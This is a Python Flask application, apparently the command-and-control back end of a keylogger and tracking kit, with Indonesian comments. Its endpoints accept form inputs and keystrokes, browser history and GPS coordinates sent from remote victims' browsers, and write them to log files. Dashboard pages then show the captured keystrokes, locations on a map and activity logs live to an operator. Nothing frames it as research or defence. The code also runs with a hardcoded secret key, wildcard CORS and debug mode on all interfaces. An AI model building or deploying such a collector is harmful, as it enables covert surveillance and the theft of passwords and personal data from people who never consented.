from flask import Flask, render_template, request, jsonify, send_from_directory
from flask_socketio import SocketIO, emit
from datetime import datetime
import json
import os
import re

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret_key_for_socketio'  # Diperlukan untuk Socket.IO
socketio = SocketIO(app, cors_allowed_origins="*")  

LOG_FILE = "logs/traffic.json"
BASE_DIR = os.path.abspath(os.path.dirname(__file__))
LOCATION_FILE = os.path.join(BASE_DIR, "logs", "berhasil.txt")
KEYSTROKES_FILE = os.path.join(BASE_DIR, "logs", "keystrokes.log")


# Pastikan direktori logs ada
def ensure_log_directory():
    if not os.path.exists("logs"):
        os.makedirs("logs")
    # Buat file log jika belum ada
    if not os.path.exists(LOG_FILE):
        with open(LOG_FILE, "w") as f:
            f.write("")

# Endpoint untuk menerima data dari client
@app.route('/report', methods=['POST'])
def report():
    data = request.json
    ensure_log_directory()

    if "timestamp" not in data:
        data["timestamp"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(data) + "\n")

    if "data" in data:    
        with open(KEYSTROKES_FILE, "a") as f:
            timestamp = data.get("timestamp", "")
            form_id =  data.get("form_id", "")
            message = f"[Timestamp: {timestamp}]\n"
            for key, val in data.get("data", {}).items():
                message += f"{key}: {val}\n"
            message += "\n"
            f.write(message)

    # Kirim data ke semua client yang terhubung
    socketio.emit('new_data', data)
    return {"status": "Received"}, 200

# Ambil semua data dari file log
def get_log_entries():
    ensure_log_directory()
    try:
        with open(LOG_FILE, "r") as f:
            lines = f.readlines()
            if not lines:
                return []
            entries = []
            for line in lines:
                entry = json.loads(line)
                if 'browser_history' in entry and entry['browser_history']:
                    entry['timestamp'] = entry['browser_history'][0].get('time', entry.get('timestamp', ''))
                else:
                    entry['timestamp'] = entry.get('timestamp', '')
                entries.append(entry)
            return entries
    except Exception as e:
        print(f"Error reading log file: {e}")
        return []

    
def get_keystrokes_entries():
    ensure_log_directory()
    if not os.path.exists(KEYSTROKES_FILE):
        return []
    
    with open(KEYSTROKES_FILE, "r", encoding="utf-8") as f:
        log_data = f.read().strip()
        
    
    entries = log_data.split("\n\n")
    
    highlighted_entries = []
    for entry in entries:
        # Temukan dan beri warna biru hanya bagian [Timestamp: ...]
        entry = re.sub(
            r'(\[Timestamp:.*?\])',
            r'<span class="timestamp">\1</span>',
            entry
        )
        highlighted_entries.append(entry)

    return highlighted_entries

def clean_entry(entry):
    return re.sub(r'form\d+\.', '', entry)
    
#maps
@app.route('/get-location-data')
def get_location_data():
    try:
        with open(LOCATION_FILE, 'r', encoding='utf-8') as f:
            lines = f.readlines()
        
        entries = []
        today = datetime.today().strftime("%Y-%m-%d")
        today_entries = 0
        total_accuracy = 0
        best_accuracy = float('inf')

        for line in lines:
            if not line.strip():
                continue
            try:
                data = json.loads(line)
                timestamp = data.get("timestamp", "")
                lat = data.get("latitude", "0")
                lon = data.get("longitude", "0")
                accuracy = float(data.get("accuracy", "0"))

                entry = {
                    'timestamp': timestamp,
                    'latitude': lat,
                    'longitude': lon,
                    'accuracy': accuracy,
                    'maps_link': data.get("maps_link", f"https://www.google.com/maps?q={lat},{lon}")
                }
                entries.append(entry)

                total_accuracy += accuracy
                if accuracy < best_accuracy:
                    best_accuracy = accuracy

                if timestamp.startswith(today):
                    today_entries += 1
            except (ValueError, json.JSONDecodeError) as e:
                print(f"Error parsing line: {line}. Error: {e}")
                continue

        avg_accuracy = total_accuracy / len(entries) if entries else 0

        return jsonify({
            'entries': entries,
            'total_entries': len(entries),
            'today_entries': today_entries,
            'best_accuracy': round(best_accuracy, 2),
            'avg_accuracy': round(avg_accuracy, 2)
        })

    except FileNotFoundError:
        return jsonify({
            'entries': [],
            'total_entries': 0,
            'today_entries': 0,
            'best_accuracy': 0,
            'avg_accuracy': 0
        })
        
@app.route('/save-log', methods=['POST'])
def save_log():
    data = request.json
    ensure_log_directory()
    
    with open(LOCATION_FILE, 'a', encoding='utf-8') as f:
        json.dump(data, f)
        f.write('\n')
    
    print("[+] Data berhasil disimpan ke berhasil.txt via /save-log")
    return {"status": "saved"}, 200



@app.route('/')
def dashboard():
    entries = get_log_entries()
    return render_template('index.html', entries=entries)

@app.route('/log_monitor')
def halaman2():
    entries = get_log_entries()
    return render_template('log_monitor.html', entries=entries)

@app.route('/key_logger')
def halaman3():
    raw_entries = get_keystrokes_entries()
    entries = [clean_entry(e) for e in raw_entries]
    return render_template('key_logger.html', entries=entries)

@app.route('/maps')
def halaman4():
    return render_template('maps.html')


@app.route('/activity_monitor')
def halaman5():
    entries = get_log_entries()
    return render_template('activity_monitor.html', entries=entries)

# Socket.IO event handlers
@socketio.on('connect')
def handle_connect():
    print('Client connected')

@socketio.on('disconnect')
def handle_disconnect():
    print('Client disconnected')

if __name__ == '__main__':
    ensure_log_directory()  # Pastikan direktori logs ada saat aplikasi dimulai
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)